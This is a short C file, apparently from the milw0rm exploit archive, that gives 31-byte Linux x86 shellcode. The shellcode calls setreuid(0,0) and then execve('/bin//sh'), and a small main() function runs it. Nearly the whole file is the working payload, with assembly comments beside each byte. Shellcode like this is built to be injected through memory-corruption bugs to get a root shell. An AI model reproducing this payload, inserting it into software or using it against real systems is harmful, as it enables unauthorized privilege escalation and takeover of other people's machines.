/* 31 byte setreuid() shellcode - # man shadow
* os: Slackware 9.1, Phlak 2.4, Knoppix 0.1
*
* www.manshadow.org
* r-22@manshadow.org
* irc.efnet.net #_man_shadow
*/

char shellcode[] =
"\x31\xC9"              /* xor ecx,ecx     */
"\x31\xDB"              /* xor ebx,ebx     */
"\x6A\x46"              /* push byte 70    */
"\x58"                  /* pop eax         */
"\xCD\x80"              /* int 80h         */
"\x51"                  /* push ecx        */
"\x68\x2F\x2F\x73\x68"  /* push 0x68732F2F */
"\x68\x2F\x62\x69\x6E"  /* push 0x6E69622F */
"\x89\xE3"              /* mov ebx,esp     */
"\x51"                  /* push ecx        */
"\x53"                  /* push ebx        */
"\x89\xE1"              /* mov ecx,esp     */
"\x99"                  /* cdq             */
"\xB0\x0B"              /* mov al,11       */
"\xCD\x80";             /* int 80h         */

int main(int argc, char *argv[]) {
       void (*sc)() = (void *)shellcode;
       printf("len:%d\n", strlen(shellcode));
       sc();
       return 0;
}

// milw0rm.com [2004-12-26]